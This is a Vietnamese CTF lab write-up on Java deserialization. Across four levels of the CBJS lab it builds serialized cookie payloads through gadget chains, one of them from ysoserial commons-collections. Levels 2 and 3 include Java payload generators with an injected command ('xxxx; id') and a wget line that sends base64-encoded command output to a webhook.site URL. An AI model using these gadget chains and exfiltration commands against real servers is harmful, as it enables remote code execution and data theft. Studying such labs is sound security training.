---
title: Java Deserialize CBJS Lab
categories: [pentesting, Web-Exploitation, CTF]
tags: [CTF, Web]
---

# Java Deserialize CBJS Lab 

### Giải thích chi tiết về lỗ hổng Deserialization

**1. Deserialization là gì?**
- Serialization là quá trình chuyển đổi một object (đối tượng) trong bộ nhớ thành một định dạng có thể lưu trữ hoặc truyền tải (như byte stream, JSON, XML).

- Deserialization là quá trình ngược lại - chuyển đổi dữ liệu đã được serialize trở lại thành object trong bộ nhớ.

**2. Nguyên nhân**
 Lỗ hổng xảy ra khi:

- Ứng dụng deserialize dữ liệu từ nguồn không tin cậy (user input, network).
- Không có validation/filtering đầu vào Attacker có thể kiểm soát nội dung được deserialize.
- Quá trình deserialization tự động thực thi code trong object

**3. Tác động**
- Remote Code Execution (RCE): Thực thi mã độc từ xa.
- Authentication bypass: Vượt qua xác thực.
- Privilege escalation: Leo thang đặc quyền.
- Denial of Service (DoS): Làm sập hệ thống.
- SQL Injection: Thông qua object manipulation.
- 
**4. Các ngôn ngữ bị ảnh hưởng**
- Java (ObjectInputStream)
- PHP (unserialize)
- Python (pickle)
- .NET (BinaryFormatter)
- Ruby (Marshal)

### Exploit and POC

### Level 1:

![image](https://hackmd.io/_uploads/BkWdaEspel.png)

Level 1 đưa ta đến với 1 giao diện khá là đơn giản khi không có gì ngoài dòng Hello Servlet để trỏ đến trang khác bây giờ mình sẽ thử click vào để xem thử ra cái gì.

![image](https://hackmd.io/_uploads/HJid6VsTeg.png)

Nó trả về cho ta 1 dòng là `Hello Guest` còn lại không có gì bây giờ ta sẽ thử với burpsuite xem thử quá trình request sẽ có những gì xảy ra.

![image](https://hackmd.io/_uploads/H1Tztshpxl.png)

Request có vẻ không đưa ra nhiều thông tin cần thiết cho ta nhưng ta để ý rằng có user cookie khá là đáng ngờ trong trường hợp này.

Level 1 bao gồm 3 class chính đó là : 

- HelloServlet.java
- User.java
- Admin.java

```java 
package com.example.javadeserialize;

import java.io.*;

public class User implements Serializable {
    private String name;
    public User() {
        this.name = "Guest";
    }

    @Override
    public String toString() {
        return this.name;
    }

    public String getName() {
        return this.name;
    }

}
```

Ở class user có 1 thuộc tính là name và method `getName()` để trả về giá trị name.

```java 
package com.example.javadeserialize;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Admin extends User {
    private String getNameCMD;
    public Admin() {
        this.getNameCMD = "whoami";
    }

    @Override
    public String toString() {
        try {
            Process proc = Runtime.getRuntime().exec(this.getNameCMD);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            return stdInput.readLine();
        } catch (IOException e) {
            return "";
        }
    }
}
```

Đây là class admin nó sẽ kế thừa class User và có thêm 1 thuộc tính là `getNameCMD` trả về kết quả của `whoami`, sau đó là hàm `toString` và đây cũng là một magic method của java.

```java 
public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        try {
            response.setContentType("text/html");
            PrintWriter out = response.getWriter();
            // Get list of cookie
            Map<String, String> cookieMap = Arrays.stream(request.getCookies()).collect(Collectors.toMap(Cookie::getName, Cookie::getValue));
            // Check is user cookie has already set
            User user;
            if (!cookieMap.containsKey("user")) {
                user = new User();
                Cookie cookie = new Cookie("user", serializeToBase64(user));
                response.addCookie(cookie);
            } else {
                try {
                    user = (User)deserializeFromBase64(cookieMap.get("user"));
                } catch (Exception e) {
                    out.println("Please don't hack me");
                    e.printStackTrace();
                    return;
                }
            }
            out.println("<html><body>");
            out.println("<h1>Level 1 Hello " + user + "</h1>");
            out.println("</body></html>");
        } catch (Exception e) {
            response.setContentType("text/html");
            PrintWriter out = response.getWriter();
            out.println("Something went wrong");
            return;
        }
```

Đến với class `HelloServlet.java` thì đây là phần xử lý logic chính của cả bài ở đây nó sẽ thực hiện deserialize cookie để lấy được giá trị của User nhưng trong trường hợp không tồn tại cookie của user thì nó sẽ tạo một cookie mới và đưa lại xử lý như cũ.

```java 
public class HelloServlet extends HttpServlet {
    public String serializeToBase64(Serializable obj) throws IOException {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(output);
        oos.writeObject(obj);
        oos.close();
        return Base64.getEncoder().encodeToString(output.toByteArray());
    }
```

Hàm ở đây có `writeObject()` là hàm serialize của java.

```java 
private static Object deserializeFromBase64(String s) throws IOException, ClassNotFoundException {
        byte[] data = Base64.getDecoder().decode(s);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        Object o  = ois.readObject();
        ois.close();
        return o;
    }
```

Sau đó sẽ là hàm deserialize với method là `readObject()`.

Sau khi phân tích ta thấy ở đoạn hàm `doGet()` ở đó có một dòng:

```java 
out.println("<h1>Level 1 Hello " + user + "</h1>");
```

Ở đây là một đoạn ghép chuỗi và nó đã gọi đến hàm toString() và kích hoạt magic method đó, khi mà `toString()` được kích hoạt thì nó sẽ gọi đến câu OS command là `whoami` và trả về kết quả sau khi thực thi đó.

Đó sẽ là cái sink để ta có thể khai thác ta sẽ đi theo hướng exploit để có thể tạo ra một cái cookie đúng theo cấu trúc nhưng khác ở đây là ta có thể thay đổi được nội dung sau khi serialize theo ý thích của mình việc còn lại chỉ cần inject cookie mới vào để nó deserialize ra bây giờ ta sẽ đi đến với bước code exploit.

Với code exploit ta sẽ giữ lại hầu như các function các class sẵn có để có thể tạo thành gadget đúng theo ý mình và đúng theo cách hoạt động của web app.

![image](https://hackmd.io/_uploads/r1923jhaee.png)

Tại `Admin.java` mình tiến hành thay đổi câu lệnh whoami thành `id` để khi nó gọi đến toString thì thay vì gọi cmd là whoami bây giờ nó sẽ trả về giá trị sau khi thực thi câu lệnh id.

![image](https://hackmd.io/_uploads/H12UTi2aee.png)

Tại đây vì sử dụng class Admin nên ta sẽ thay đổi `User user = new User()` sang `User user = new Admin()` để cho đúng với cấu trúc.

Sau đó viết một class `GeneratePayload.java` có nội dung: 

```java 
package com.example.javadeserialize;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

public class GeneratePayload {

    public static void main(String[] args) {
        try {
            System.out.println(">>> Đang chuẩn bị tạo payload...");
            Admin payloadObject = new Admin();

            System.out.println(">>> Generate payload object: " + payloadObject);


            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);

            objectOutputStream.writeObject(payloadObject);
            objectOutputStream.close();
            byte[] serializedBytes = byteArrayOutputStream.toByteArray();
            String base64Payload = Base64.getEncoder().encodeToString(serializedBytes);

            System.out.println("\n--- Complete! ---");
            System.out.println("Cookie:");
            System.out.println("======================================================================");
            System.out.println(base64Payload);

        } catch (Exception e) {
            System.err.println("Đã có lỗi xảy ra!");
            e.printStackTrace();
        }
    }
}
```

Code này sẽ giúp in ra user cookie sau khi mình ghép các gadget lại với nhau tạo ra user cookie đã được sửa thành payload.

![image](https://hackmd.io/_uploads/B1oPCjnTex.png)

Thành công gen ra được payload bây giờ ta sẽ thử thay thế vào xem kết quả.

![image](https://hackmd.io/_uploads/Hyap0j3aeg.png)

Thành công thực thi câu lệnh id bây giờ ta hoàn toàn có thể RCE web theo ý muốn.

![image](https://hackmd.io/_uploads/H1cjlh3Txx.png)

Debug ở đây cho ta thấy bây giờ giá trị đúng là id vậy nên ta đã hoàn toàn khai thác được level này.

### Level 2:

![image](https://hackmd.io/_uploads/Skwxqh26ex.png)

Về bên ngoài thì có vẻ như level 2 cũng không quá khác biệt với level 1 vẫn chỉ là chức năng như chỉ là chương trình có thêm chức năng kiểm tra HTTP Connection bằng cách sử dụng os command ping và curl.

![image](https://hackmd.io/_uploads/BJmN033peg.png)

![image](https://hackmd.io/_uploads/By2zi2hagx.png)

Đến với source code của level 2 ta thấy rằng có 3 class mới gồm:

- HTTPConnection.java
- MyHTTPClient.java
- MyRequestServlet.java

Còn lại thì nó vẫn giống như level 1 bây giờ ta sẽ thử đọc đoạn code đã gọi đến magic method giống level trước để xem cái sink có còn tồn tại hay không.

```java 
this.message = "Level 2 Hello " + user.getName();
            out.println("<html><body>");
            out.println("<h1>" + message + "</h1>");
            out.println("</body></html>");
        } catch (Exception e) {
            response.setContentType("text/html");
            PrintWriter out = response.getWriter();
            out.println("Something went wrong");
            return;
        }
```

Ở đây ta để ý rằng phần cộng chuỗi bây giờ đã bị thay đổi thành user.getName() là gọi thẳng function thay vì gọi toString như ở level 1 nên không có magic method ở đây để tạo sink nữa nó sẽ lấy thẳng user name thẳng từ trong `User.java` luôn.

```java 
package com.example.javadeserialize;

import java.io.Serializable;

public class User implements Serializable {
    private String name;

    public User(String name) {
        this.name = name;
    }

    public String getName() { //getName ở đây
        return this.name;
    }

}
```

Vậy nên ta sẽ đi đến với 3 class mới để tìm gadget gọi đến magic method để xem liệu có hướng nào không.

Đến với class HTTPConnection thì có vẻ như không có cái gì đặc biệt ở đây để khai thác:

```java 
package com.example.javadeserialize;

import java.io.IOException;
import java.io.Serializable;

public class HTTPConnection implements Serializable {
    private String url;
    public HTTPConnection(String url) {
        this.url = url;
    }

    public void connect() throws IOException, InterruptedException {
        // TODO: connect to this.url
    }
}
```

Nó chỉ khởi tạo biến url sau đó thực hiện connect.

Ở class MyHTTPClient.java ta nhận thấy có 2 cái sink khả nghi có thể khai thác được đó là ở hàm `sendRequest()` và hàm `readObject()`:

```java 
public void sendRequest() {
        String path = "/bin/bash";
        ProcessBuilder pb = new ProcessBuilder(path, "-c", "curl " + this.host);
        try {
            Process curlProcess = pb.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```

```java 
 private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, InterruptedException {
        in.defaultReadObject();
        // Test connection
        String path = "/bin/bash";
        ProcessBuilder pb = new ProcessBuilder(path, "-c", "ping " + this.host);
        Process ping = pb.start();
        int exitCode = ping.waitFor();
        // TODO: add implement for exitCode check
    }
```

Ở đây ProcessBuilder là một hàm nguy hiểm nó có thể chạy tiến trình tới đường dẫn mà dev truyền vào và ở đây đoạn `sendRequest()` nó đang thực hiện `curl` đến với giá trị `this.host` đây là một sink hoàn toàn có khả năng thực hiện `OS command Injection` vậy nên bây giờ ta phải tìm được nơi gọi đến hàm `sendRequest()` để củng cố kịch bản.

![image](https://hackmd.io/_uploads/HyKLgah6le.png)

Ở class MyRequestServlet.java ta tìm được nơi gọi đến function `sendRequest()` nhưng ở đây nó đã bị comment lại nên có vẻ sẽ không có kịch bản khai thác hàm này ở đây.

Bây giờ ta sẽ chỉ còn lại 1 sink đó là ở hàm `readObject()` ta có thể nhận ra ngay rằng hàm `readObject` này là một magic method nó sẽ được tự động gọi khi chương trình tiến hành deserialize data và truyền giá trị vào OS Command ở dòng `        ProcessBuilder pb = new ProcessBuilder(path, "-c", "ping " + this.host);`

![image](https://hackmd.io/_uploads/Hk7jz6hpgx.png)


Vậy ở đây ta hoàn toàn có thể lợi dụng nó để tiến hành nối dài câu OS Command ở đây ta sẽ inject thêm ở `this.host` thành `xxxx; id` dấu `;` sẽ thực hiện nối dài câu OS Command và thực thi thêm câu lệnh `id` ở đằng sau.

Bây giờ ta sẽ thực hiện phần code exploit, phần code sẽ không khác gì cũ ta sẽ chỉ cần copy 3 class mới vào thêm vào đó ta tiến hành code sửa lại phần hàm.

![image](https://hackmd.io/_uploads/Sk9tVTn6le.png)

Ở đây ta khởi tạo `MyHTTPClient` và thực hiện gọi `xxxx; id` vì ở đây phần mình inject đó sẽ được gọi vào `this.host`.

Đó là logic tấn công của ta bây giờ sẽ là code để gen ra được payload:

```java 
package com.example.javadeserialize;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class GeneratePayload {

    public static void main(String[] args) {
        try {
          
            String commandToInject = "xxxx; id"; 

            System.out.println(">>> Gen payload Level 2...");
            System.out.println(">>> Inject: '" + commandToInject + "'");

            // Bước 1: Tạo đối tượng gadget MyHTTPClient với payload của chúng ta
            MyHTTPClient payloadObject = new MyHTTPClient(commandToInject);

            System.out.println(">>> Process...");

            // Bước 2 & 3: Serialize và encode Base64 (giữ nguyên như cũ)
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);

            objectOutputStream.writeObject(payloadObject);
            objectOutputStream.close();

            byte[] serializedBytes = byteArrayOutputStream.toByteArray();
            String base64Payload = Base64.getEncoder().encodeToString(serializedBytes);

            // Bước 4: In ra kết quả cuối cùng
            System.out.println("\n--- Done! ---");
            System.out.println("Cookie Level 2:");
            System.out.println("======================================================================");
            System.out.println(base64Payload);
            System.out.println("======================================================================");

        } catch (Exception e) {
            System.err.println("Error!");
            e.printStackTrace();
        }
    }
}
```

![image](https://hackmd.io/_uploads/ryNb8phTgl.png)

Thành công gen ra được cookie payload : `rO0ABXNyAChjb20uZXhhbXBsZS5qYXZhZGVzZXJpYWxpemUuTXlIVFRQQ2xpZW50xxgQsBtC2FUCAAFMAARob3N0dAASTGphdmEvbGFuZy9TdHJpbmc7eHIAKmNvbS5leGFtcGxlLmphdmFkZXNlcmlhbGl6ZS5IVFRQQ29ubmVjdGlvbjaZ6lLJoIWoAgABTAADdXJscQB+AAF4cHQAD2h0dHA6Ly94eHh4OyBpZHQACHh4eHg7IGlk`

![image](https://hackmd.io/_uploads/B1-EI626ll.png)

Tiến hành inject cookie mới vào xem thử kết quả sẽ trả về như thế nào.

![image](https://hackmd.io/_uploads/Bk3BLa2pge.png)

Kết quả có vẻ không như mong muốn có vẻ như ta đã làm sai ở một bước nào đó bây giờ kiểm tra lại code đoạn thực hiện deserialize vì lỗi này nó nằm ở catch của phần deserialize.

![image](https://hackmd.io/_uploads/r1A6La36xe.png)

Để ý rằng ở đây có vẻ như cookie bị ép kiểu thành user nên có vẻ chính nó đã gây lỗi ở phần cookie nên nó trả về exception. Nhưng liệu trước khi chạm đến phần deserialize thì liệu nó đã thực thi OS Command chưa bây giờ ta sẽ thử Debug.

![image](https://hackmd.io/_uploads/B1kytp26gl.png)

Ta có thể thấy rằng giá trị của this.host đã được gán và thực thi vậy ở đây ta có thể kết luận là blind OS Command Injection bây giờ ta có 3 cách đó là đưa kết quả ra ngoài , error based và time based ta sẽ chọn cách đưa kết quả ra ngoài bằng webhook cho dễ.

`String commandToInject = "xxxx; wget https://webhook.site/12df02bf-338e-46a4-bed3-363434d64f1e"; 
`

Sửa thành như này xem liệu bên webhook có nhận request hay không.

![image](https://hackmd.io/_uploads/rk4x9p26ge.png)

Thành công nhận được request đến từ server đến webhook bây giờ ta sửa một chút ở PayloadGenerate.java để nó đưa kết quả của câu lệnh `id` ra.

```java 
 public static void main(String[] args) {
        try {

            String commandToRun = "id"; // <-- BẠN CÓ THỂ THAY LỆNH Ở ĐÂY (ví dụ: "whoami", "ls -la /")

            // Lệnh đầy đủ sẽ được inject vào shell
            String commandToExfiltrate = "wget --no-check-certificate --post-data=\"$(" + commandToRun + " | base64)\" https://webhook.site/12df02bf-338e-46a4-bed3-363434d64f1e";

            // Payload cuối cùng để inject vào `ping`
            String finalPayload = "xxxx; " + commandToExfiltrate;

            System.out.println(">>> Generate Payload '" + commandToRun + "' ra webhook...");
            System.out.println(">>> Commands: " + finalPayload);
```

![image](https://hackmd.io/_uploads/S1qRnanTeg.png)

Thành công trả về giá trị sau khi của kết quả câu lệnh id ở đây mình encode thành base64 để tránh các lỗi không mong muốn.

![image](https://hackmd.io/_uploads/Hk9bpThTxg.png)

Kết quả đúng với câu lệnh kết luận ta đã thành công RCE.

### Level 3:

Với level 3 thì chức năng vẫn sẽ tương tự với các level trước nên ta đi thẳng vào phân tích source code luôn.

Phần lớn source code vẫn sẽ giống như là level 2 khác cái giờ không có readObject để lợi dụng như level 2 nữa nên ta sẽ phân tích những đoạn sink có thể khai thác được.

Sau một lúc đọc thì tôi tìm thấy sink có thể khai thác được ở class MyHTTPClient.java.

```java 
 @Override
    public void connect() throws IOException, InterruptedException {
        // Test connection
        String path = "/bin/bash";
        ProcessBuilder pb = new ProcessBuilder(path, "-c", "ping " + this.host);
        Process ping = pb.start();
        int exitCode = ping.waitFor();
        // TODO: add implement for exitCode check
    }
```

Ở đây có function là `connect()` bên trong là hàm `ProcessBuilder` là một unsafe method cùng với đó là câu lệnh OS Command được thực thi bằng nó đây là sự kết hợp giữa Untrusted Data cùng với Unsafe method và ta hoàn toàn có thể lợi dụng nó để thực hiện CMDi như ở level trước vấn đề bây giờ ta phải tìm xem class nào gọi đến hàm `connect()`.

Ở class TestConnection.java ta đã tìm thấy `connect()` được gọi.

```java 
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, InterruptedException {
        in.defaultReadObject();
        // Re-create the connection
        this.connection.connect();
    }
```

Từ đây ta đã hoàn thiện sink rồi bây giờ chỉ cần tạo thêm object `TestConnection` vì trong đó có `readObject` để gọi hàm `connect()`.

![image](https://hackmd.io/_uploads/rJKJJSppxl.png)

Bây giờ viết payload để in ra được cookie và tiến hành inject thôi.

```java 
package com.example.javadeserialize;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class GeneratePayload {

    public static void main(String[] args) {
        try {
            String commandToRun = "id"; 
            String commandToExfiltrate = "wget --no-check-certificate --post-data=\"$(" + commandToRun + " | base64)\" https://webhook.site/12df02bf-338e-46a4-bed3-363434d64f1e";
            String finalPayload = "xxxx; " + commandToExfiltrate;

            System.out.println(">>> Generating Java deserialization payload...");
            System.out.println(">>> Command to be executed on server: " + finalPayload);

            // Step 1: Create the "inner" object (Sink)
            // This is the MyHTTPClient object containing our malicious command.
            MyHTTPClient maliciousHttpClient = new MyHTTPClient(finalPayload);

            // Step 2: Create the "outer" object (Entry Point)
            // This is the TestConnection object that will be deserialized by the server.
            // We inject our malicious object into its `connection` field.
            TestConnection payloadObject = new TestConnection(maliciousHttpClient);

            System.out.println(">>> Gadget chain created. Starting serialization and encoding...");

            // Step 3 & 4: Serialize and encode Base64 (unchanged)
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);

            // Write the TestConnection object (which contains MyHTTPClient) to the stream
            objectOutputStream.writeObject(payloadObject);
            objectOutputStream.close();

            byte[] serializedBytes = byteArrayOutputStream.toByteArray();
            String base64Payload = Base64.getEncoder().encodeToString(serializedBytes);

            // Step 5: Print the final result
            System.out.println("\n--- Done! ---");
            System.out.println("Cookie Level 3 (Gadget Chain):");
            System.out.println("======================================================================");
            System.out.println(base64Payload);
            System.out.println("======================================================================");

        } catch (Exception e) {
            System.err.println(">>> An error occurred!");
            e.printStackTrace();
        }
    }
}
```

![image](https://hackmd.io/_uploads/HJnLxSa6xe.png)

Thành công gen ra được cookie mới của level 3.

![image](https://hackmd.io/_uploads/HkhdeHpTll.png)

Thay cookie mới vào và lưu nó lại.

![image](https://hackmd.io/_uploads/SJXqgrpaex.png)

Server trả về kết quả như này nhưng không cần quan tâm vì như đã debug ở bài trước thì quá trình deserialize được thực thi trước khi nổ ra lỗi.

![image](https://hackmd.io/_uploads/BJiTeH6agl.png)

![image](https://hackmd.io/_uploads/rygJkZHTpel.png)

Thành công RCE ở level 3.

### Level 4:

Đến với level 4 thì chức năng của nó trên GUI thì vẫn sẽ như cũ nên ta sẽ nhìn thẳng vào source code luôn.

Ở level này các class khác đã bị loại bỏ hết chỉ còn mỗi 2 class chính là:

- HelloServlet.java
- User.java

Cũng tựa tựa như level 1 khi chỉ có mỗi 2 class còn lại bây giờ ta sẽ đi vào 2 class duy nhất để xem thử có đường nào để có thể khai thác hay không.

Sau một lúc đọc 2 class thì nó cũng hầu như không có hướng để có thể khai thác được vì ta chỉ có duy nhất class User để gọi method nhưng không có gì ở bên trong nên ta sẽ phân tích thử các file được include vào.

Ở file pom.xml có một đoạn có khả năng đưa cho ta thông tin để có thể tìm kiếm gadget trên mạng.

```xml 
 <dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.1</version>
</dependency>
```

![image](https://hackmd.io/_uploads/BkLNNHTTee.png)

Sau một lúc tìm kiếm nhận ra rằng ysoserial có gadget để khai thác đực commons-collections ver 3.1 đã được include trong dependency của server.

![image](https://hackmd.io/_uploads/ryh3US6agg.png)

Dùng ysoserial thành công tạo được cookie để payload bây giờ tiến hành inject.

![image](https://hackmd.io/_uploads/ByZdPS6pxg.png)

Thay cookie và save vào.

![image](https://hackmd.io/_uploads/HyotvBT6el.png)

Thành công lấy được request về giờ ta đã RCE thành công level cuối cùng của bài deserialize.














